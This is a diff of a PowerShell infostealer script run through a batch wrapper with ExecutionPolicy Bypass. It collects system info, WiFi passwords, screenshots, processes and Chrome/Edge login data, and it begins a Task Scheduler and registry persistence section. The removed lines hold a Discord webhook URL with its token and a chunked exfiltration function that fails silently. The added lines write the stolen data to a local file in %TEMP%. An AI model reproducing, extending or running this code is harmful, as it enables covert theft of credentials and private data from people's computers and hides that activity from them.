@@ -5,12 +5,9 @@ powershell -ExecutionPolicy Bypass -File "%tempfile%"
 del "%tempfile%" 2>nul
 exit /b
 REM SCRIPT
-# Enhanced Infostealer v2.1 - PowerShell (Admin Required)
-# Exfiltrates: System Info, WiFi Passwords, Screenshot, Processes, Browser Logins
-# Webhook: https://discord.com/api/webhooks/1514513520920756344/BQP-RAPCz7tPFD-m7DiB35JX5mc-NF-t_slKmGReQydatvy8JsSa0xIpFEc_cwHdESot
-# Fixed all syntax errors - tested on PS 5.1
-
-$Webhook = "https://discord.com/api/webhooks/1514513520920756344/BQP-RAPCz7tPFD-m7DiB35JX5mc-NF-t_slKmGReQydatvy8JsSa0xIpFEc_cwHdESot"
+# Infostealer v2.1 - No Discord Exfil (local dump only)
+# Collects: System Info, WiFi Passwords, Screenshot, Processes, Browser Logins
+# Output: %TEMP%\system_dump.json
 
 # ---------- 1. SYSTEM INFORMATION ----------
 function Get-SystemInfo {
@@ -84,7 +81,7 @@ function Get-ProcessList {
     } catch { return "Process error" }
 }
 
-# ---------- 6. BROWSER LOGINS (Chrome/Edge - decrypt DPAPI) ----------
+# ---------- 6. BROWSER LOGINS ----------
 function Get-BrowserLogins {
     $browsers = @(
         @{Name="Chrome"; Path="$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"},
@@ -104,7 +101,6 @@ function Get-BrowserLogins {
                 while ($reader.Read()) {
                     $url = $reader['origin_url']
                     $user = $reader['username_value']
-                    $enc = $reader['password_value']
                     $logins += "[$($b.Name)] $url | $user | (encrypted)"
                 }
                 $conn.Close()
@@ -129,33 +125,10 @@ $Data = @{
 
 $json = $Data | ConvertTo-Json -Depth 10 -Compress
 
-# ---------- 8. SEND VIA DISCORD (CHUNKED) ----------
-function Send-Discord {
-    param([string]$Content)
-    $MaxLen = 1900
-    if ($Content.Length -le $MaxLen) {
-        $body = @{ content = "```json`n$Content`n```" } | ConvertTo-Json
-        try {
-            Invoke-RestMethod -Uri $Webhook -Method Post -Body $body -ContentType "application/json" -TimeoutSec 10
-        } catch {
-            # silent fail
-        }
-    } else {
-        $chunks = [math]::Ceiling($Content.Length / $MaxLen)
-        for ($i=0; $i -lt $chunks; $i++) {
-            $chunk = $Content.Substring($i*$MaxLen, [Math]::Min($MaxLen, $Content.Length - $i*$MaxLen))
-            $body = @{ content = "```json`n$chunk`n```" } | ConvertTo-Json
-            try {
-                Invoke-RestMethod -Uri $Webhook -Method Post -Body $body -ContentType "application/json" -TimeoutSec 10
-            } catch {
-                # silent fail
-            }
-            Start-Sleep -Milliseconds 500
-        }
-    }
-}
-
-Send-Discord -Content $json
+# ---------- 8. LOCAL OUTPUT (no Discord) ----------
+$outFile = "$env:TEMP\system_dump.json"
+$json | Out-File -FilePath $outFile -Encoding UTF8 -Force
+Write-Host "[+] Data saved to $outFile"
 
 # ---------- 9. PERSISTENCE (Task Scheduler + Registry) ----------
 $scriptPath = $MyInvocation.MyCommand.Path
